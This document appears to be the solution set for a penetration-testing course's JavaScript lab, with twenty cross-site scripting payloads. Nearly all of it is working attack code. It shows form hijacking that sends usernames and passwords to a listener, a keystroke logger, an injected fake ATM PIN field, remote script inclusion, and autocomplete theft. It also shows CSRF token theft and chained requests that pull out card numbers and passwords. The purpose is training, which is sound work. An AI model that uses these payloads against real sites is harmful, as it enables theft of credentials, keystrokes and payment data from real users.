* Solution 1: Modifying HTML

<script>

document.getElementsByTagName("h2")[2].innerHTML = "Modified You";
document.getElementsByTagName("h1")[0].innerHTML = "Found You";

</script>


* Solution 2: Changing Links

<script>

var links = document.getElementsByTagName("a");

for  (i=0; i < links.length; i++)
	
{
  links[i].href = "http://PentesterAcademy.com/topics";
  links[i].innerHTML = "Link Modified";
}

</script>


* Solution 3: Hijack Form Submit

<script>

function InterceptForm() 

{
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;
	new Image().src = "http://localhost/?username="+username+"&password="+password;
}

document.forms[0].onsubmit = InterceptForm;

</script>


* Solution 4: Modifying Form Fields

<script>

var input = document.createElement("input");

input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input, previous);
document.forms[0].action = "http://localhost/";

</script>


* Solution 5: Social Engineering

<script>

var input = document.createElement("h2");

input.innerHTML = "Website is Down. Please visit SecurityTube.net";

document.forms[0].parentNode.appendChild(input);
document.forms[0].parentNode.removeChild(document.forms[0]);

</script>


* Solution 6: Capture All Clicks

<script>

function CaughtClick () 

{
	location.href = "https://www.PentesterAcademy.com";
}

document.body.addEventListener('click', CaughtClick, true);

</script>


* Solution 7: Keystroke Logging

<script>
	
document.onkeypress = function KeyLogger(inp)

{
	key_pressed = String.fromCharCode(inp.which);
	new Image().src = "http://localhost/?" + key_pressed
}
	
</script>


* Solution 8: Event Listener

" onmouseover="

document.forms[0].onsubmit = function demo ()

{
	var pass = document.forms[0].elements[1].value;
	alert (pass);
}
	

* Solution 9: Include External JS

<script src="http://demofilespa.s3.amazonaws.com/jfptest.js"></script>


* Solution 10: Include External JS using JS

var newtag = document.createElement("script");
newtag.type = "text/javascript";
newtag.src = "http://demofilespa.s3.amazonaws.com/jfptest.js";
document.body.appendChild(newtag);


* Solution 11: Replace Banner

<script>
	
document.getElementsByTagName("img")[0].src = "https://pluralsight2.imgix.net/paths/images/javascript-542e10ea6e.png"

</script>


* Solution 12: Stealing from Auto-Complete

<script>
	
window.setTimeout(function() 

{
	document.forms[0].action = 'http://localhost';
	document.forms[0].submit();
},10000);
	
</script>


* Solution 13: Posting with XML Http Request

<script>

username = document.forms[0].elements[0].value;
password = document.forms[0].elements[1].value;

window.setTimeout(function() 

{
	var req = new XMLHttpRequest();
	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
	req.send();
},10000);
	
</script>


* Solution 14: Fetching Data with XML Http Request

<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()

{
	if (req.readyState == 4 && req.status == 200)
		
	{
		document.getElementById("result").innerHTML = req.responseText;
	}
};

req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
req.send();
	
</script>


* Solution 15: Data Exfiltration with XML Http Request

<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()

{
	if (req.readyState == 4 && req.status ==200)	
{
	alert(req.responseText);
	new Image().src = "http://localhost/?cardno="+req.responseText;
}
};

req.open("POST", "/lab/webapp/jfp/15/cardstore", true);
req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
req.send("user=john");
	
</script>


* Solution 16: Extracting CSRF Tokens

<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()

{
	if (req.readyState == 4 && req.status ==200)
{
	document.getElementById("result").innerHTML=req.responseText;
}
};

var token = window.location.search.split('&')[1];

req.open("GET", "/lab/webapp/jfp/16/email?name=john&"+token, true);
req.send();
	
</script>


* Solution 17: CSRF Token Stealing

<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()

{
	if (req.readyState == 4 && req.status ==200)
{
	document.getElementById("result").innerHTML=req.responseText;
}
};

var uid = document.getElementById("uid").innerHTML.split(':')[1];
var token = document.getElementById("csrf").innerHTML.split(':')[1];

req.open("GET", "/lab/webapp/jfp/17/email?uid="+uid+"&csrf_token="+token, true);
req.send();
	
</script>


* Solution 18: HTML Parsing of XML Http Request Response

<script>

var req = new XMLHttpRequest();
req.onreadystatechange = function ()

{
	if (req.readyState == 4 && req.status ==200)
{
	var htmlPage = req.responseXML;
	var address = htmlPage.getElementById("address").innerHTML;
	alert(address);
	document.getElementById("result").innerHTML=address;
}
};

req.open("GET", "/lab/webapp/jfp/18/address", true);
req.responseType = "document";
req.send();
	
</script>


* Solution 19: Multi-level HTML Parsing

<script>

var link = document.getElementById("settings");
var req = new XMLHttpRequest();
var csrf_token = '';
var uid = '';
var req2 = new XMLHttpRequest();
req2.onreadystatechange = function ()

{
	if (req2.readyState == 4 && req2.status ==200)
{
	var htmlPage = req2.responseXML;
	credit_card = htmlPage.getElementById("result").innerHTML;
	document.getElementById("result").innerHTML = credit_card;
	new Image().src = "http://localhost/?credit_card_number="+credit_card;
}
};

req.onreadystatechange=function()
{
	if (req.readyState == 4 && req.status == 200)
	{
		var htmlPage = req.responseXML;
		csrf_token = htmlPage.forms[0].elements[1].value;
		alert(csrf_token);

		req2.open("GET", "/lab/webapp/jfp/19/getcreditcard?uid="+uid+"&csrf_token="+csrf_token, true);
		req2.responseType = "document";
		req2.send();
	}
};

uid = link.innerHTML.split(':')[1]
req.open("GET", link.href, true);
req.responseType = "document";
req.send();
	
</script>


* Solution 20: Multi-level JSON Parsing

<script>

var link = document.getElementById("settings");
var req = new XMLHttpRequest();
var token = '';
var uid = '';
var req2 = new XMLHttpRequest();
req2.onreadystatechange = function ()

{
	if (req2.readyState == 4 && req2.status ==200)
{
	var pass_obj = JSON.parse(req2.responseText);
	var password = pass_obj.resp.password;
	document.getElementById("result").innerHTML = password;
	new Image().src = "http://localhost/?password="+password+"&uid="+uid;
}
};

req.onreadystatechange=function()
{
	if (req.readyState == 4 && req.status == 200)
	{
		response_obj = JSON.parse(req.responseText);
		token = response_obj.params.token;
		
		req2.open("GET", "/lab/webapp/jfp/20/getpassword?token="+token, true);
		req2.send();
	}
};

uid = link.innerHTML.split(':')[1]
req.open("GET", "/lab/webapp/jfp/20/gettoken?uid="+uid, true);
req.send();
	
</script>

